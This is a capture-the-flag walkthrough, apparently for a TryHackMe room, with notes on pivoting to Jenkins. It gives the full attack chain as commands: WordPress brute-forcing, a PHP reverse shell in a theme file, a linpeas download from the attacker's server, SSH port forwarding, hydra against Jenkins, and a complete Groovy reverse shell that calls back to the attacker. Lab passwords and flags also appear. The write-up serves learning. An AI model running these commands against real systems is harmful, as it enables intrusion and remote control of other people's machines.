### **Steps to Solve

1. **Nmap Scan**
    
    - Performed a full port scan:  
        `nmap -sC -sV -p- 10.10.155.166`
        
    - Found open ports:
        
        - 22 (SSH)
            
        - 80 (HTTP) — Hosting a website with `/blog`, `/wordpress`, and `/phpmyadmin`
        - Scanned vuln using 
            ```
             nmap -oA nmap-vuln -Pn -script vuln -p 22,80          10.10.155.166
             ```
             
2. **Web Enumeration**
    
    - Accessed `http://10.10.155.166/blog` and `/wordpress`
        
    - Used `wpscan` to enumerate:
        
        ```
        wpscan --url http://10.10.155.166/blog/ --enumerate u
        ```
        
    - Identified WordPress version (5.4.2) and found `admin` as a potential username
        
    - Checked `phpmyadmin`, but access was denied
        
3. **Brute-Force WordPress Login**
    
    - Used `wpscan` to brute-force login via `xmlrpc.php`:
        
        ```
        wpscan --url http://10.10.155.166/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
        ```
        
    - Found valid credentials:
        
        - Username: `admin`
            
        - Password: `my2boys`
            
4. **Gained Access to WordPress Admin Panel**
    
    - Logged into `http://10.10.155.166/blog/wp-login.php`
        
    - Navigated to:  
        `Appearance → Theme Editor → 404.php`
        
5. **Reverse Shell Upload**
    
    - Replaced code in `404.php` with a PHP reverse shell
        
    - Started listener on your machine:  
        `nc -lvnp 4444`
        
    - Accessed:  
        `http://10.10.155.166/blog/wp-content/themes/twentyseventeen/404.php`  
        ⇒ Got reverse shell , made stable using `python -c "import pty;pty.spawn('/bin/bash')" , got ` `www-data`
        =>cd var/www/html
        => cd wordpress, read wp-config.php, it contains DB_name: wordpress, pass: wordpress123
        =>connect to mysql
          ```
          mysql -h localhost -u wordpress -p wordpress123
        => check wp_users, we found admin(useless).
        - In home directory , found aubreanna user, to check its parrword, using linpeas to enumerate
        
6. **Post-Exploitation Enumeration**
    
    - Uploaded `linpeas.sh` via Python HTTP server:
        
        ```
        python3 -m http.server 8000
        In $ shell: wget http://<your-IP>:8000/linpeas.sh
        chmod +x linpeas.sh
        ./linpeas.sh
        ```
        
7. **Found Credentials / Privilege Escalation**
    
    - Found readable Jenkins config file or credentials
        
    - SSH access to another user (e.g., `aubreanna`)
    - Got the password in ls /opt/wp-save.txt
    - ==su aubreanna , pass:bubb13guM!@#123==
    - cat jenkins.txt
        Internal Jenkins service is running on 172.17.0.2:8080

8. **Pivoting to Jenkins**

     - Either by msfvenom payload or just by SSHL port forwarding
    - Forwarded port via SSH:
          - Type following in attacker machine
        ```
        ssh -L 8080:localhost:8080 aubreanna@localhost
        ```
        - Start an SSH connection
        - Set up **local port forwarding**:  
          Forward your **localhost:8080** → to **172.17.0.2:8080** from the remote server.
        - Connect to the **pivot box** (already compromised) via SSH(aubreanna).
   ###  What this does:

9. You SSH into the **pivot box** at `10.10.163.33` (internal foothold).
    
10. That box **can access** `172.17.0.2:8080` (an internal Jenkins server, Docker container, etc.).
    
11. You **cannot access** `172.17.0.2` directly from your attacker machine.
    
12. But with `ssh -L`, you can now visit:
     http://localhost:8080

    - Accessed Jenkins: `http://127.0.0.1:8080`
        
13. **Command Execution via Jenkins**
    - Login using admin and crack password using hydra 
        ```
         hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://127.0.0.1:8080/j_acegi_security_check:"j_username=^USER^&j_password=^PASS^&from=%2Flogin&Submit=Sign+in":"F=Invalid username or password" -V
         ```
        - ==pass: spongebob== 
    - Use the script console
    - paste **groovy reverse shell**.
        String host=attacker ip or localhost
        int port=8044;
        String cmd="/bin/bash";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    - Got root shell
        
14. Got jenkins shell. Cat note.txt (password of root) and su root
    ==pass: tr0ub13guM!@#123==
    
==User.txt :THM{int3rna1_fl4g_1}==
==Root.txt:THM{d0ck3r_d3str0y3r}: 

---
## Pivoting and jenkins

### 🧠 **Pivoting**

- **Definition**: Using a compromised machine to access other internal network systems.
    
- **Purpose**: Reach services not directly accessible from your attacker machine.
    
- **Common Tools**: SSH local port forwarding, Metasploit SOCKS proxy, Chisel, SSHuttle.
    

---

### 🔧 **Jenkins**

- **What it is**: A CI/CD automation server for developers.
    
- **Default Port**: `8080`
    
- **Vulnerability**:
    
    - Weak/no credentials.
        
    - Ability to run system commands via Script Console (under “Manage Jenkins”).
        

---

### 🔒 **Accessing Jenkins on Localhost**

- Jenkins often runs on `127.0.0.1:8080` (localhost only).
    
- Cannot access directly from attacker machine.
    
- You must pivot via the compromised host.
    

---

### 🛠 **How to Access Jenkins (Pivot Methods)**

1. **SSH Local Port Forwarding**
    
    ```bash
    ssh -L 8080:127.0.0.1:8080 user@victim_ip
    ```
    
    → Access via `http://localhost:8080` from your machine.
    
2. **Chisel**
    
    - Lightweight TCP/HTTP tunneling tool.
        
3. **Metasploit Route & ProxyChains**
    
    - Add route to internal host.
        
    - Use SOCKS proxy for access.
        

---
